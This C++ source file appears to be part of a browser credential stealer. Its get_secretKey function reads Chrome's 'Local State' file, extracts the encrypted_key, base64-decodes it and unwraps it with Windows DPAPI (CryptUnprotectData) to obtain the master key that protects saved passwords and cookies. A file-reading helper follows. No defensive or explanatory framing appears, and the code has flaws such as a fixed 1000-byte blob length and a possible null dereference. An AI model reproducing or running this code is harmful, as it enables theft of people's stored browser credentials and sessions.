#include "decrypt_dpapi.h"


BYTE* get_secretKey()
{
    BYTE* secret_key = NULL;
    DWORD dwOut;
    DATA_BLOB DataOut,DataVerify;
    LPWSTR pDescrOut = NULL;

    LPWSTR chrome_profile_path = get_chrome_profile_path(L"\\Google\\Chrome\\User Data\\");

    if (!chrome_profile_path)
        return NULL;

    if (!SetCurrentDirectoryW(chrome_profile_path))
        return NULL;
    
    lstrcatW(chrome_profile_path, TEXT("Local State"));

    char* file = NULL, *get_file = NULL;
   
    get_file = static_cast<char*>(malloc(MAX_PATH));
    SecureZeroMemory(get_file,MAX_PATH);
    
    wcstombs(get_file, chrome_profile_path, wcslen(chrome_profile_path));
 
    file = read_file(get_file);

    cJSON* json = NULL;
    json = cJSON_Parse(file);

    if (json != NULL)
    {
        cJSON* os_crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
        char* encrypted_key = cJSON_GetObjectItemCaseSensitive(os_crypt,"encrypted_key")->valuestring;

        LPBYTE lpBuffer = base64_decode(encrypted_key, strlen(encrypted_key), (int*)&dwOut);

        unsigned char* key = _mbstok((unsigned char*)lpBuffer, (unsigned char*)"DPAPI");
        DataOut.pbData = (BYTE*)key;
        DataOut.cbData = 1000;
       
        if (!CryptUnprotectData(&DataOut, &pDescrOut, NULL, NULL, NULL, 0, &DataVerify))
        {
            return 0x0;
        }
        else
        {
            secret_key = (BYTE*)malloc(DataVerify.cbData + 1);
            SecureZeroMemory(secret_key, DataVerify.cbData + 1);
            memcpy(secret_key, DataVerify.pbData, DataVerify.cbData);
           
        }
    }
    
    secret_key[DataVerify.cbData] = '\0';
    
    cJSON_Delete(json);
    free(static_cast<void*>(file));
    LocalFree(DataVerify.pbData);
    LocalFree(pDescrOut);
    
    return secret_key;
}


char* read_file(const char* filename) {
    FILE* file = NULL;
    long length = 0;
    char* content = NULL;
    size_t read_chars = 0;


    file = fopen(filename, "rb");

    if (file == NULL)
    {
        goto cleanup;
    }


    if (fseek(file, 0, SEEK_END) != 0)
    {
        goto cleanup;
    }
    length = ftell(file);
    if (length < 0)
    {
        goto cleanup;
    }
    if (fseek(file, 0, SEEK_SET) != 0)
    {
        goto cleanup;
    }


    content = (char*)malloc((size_t)length + sizeof(""));
    if (content == NULL)
    {
        goto cleanup;
    }


    read_chars = fread(content, sizeof(char), (size_t)length, file);
    if ((long)read_chars != length)
    {
        free(content);
        content = NULL;
        goto cleanup;
    }
    content[read_chars] = '\0';


cleanup:
    if (file != NULL)
    {
        fclose(file);
    }

    return content;
}
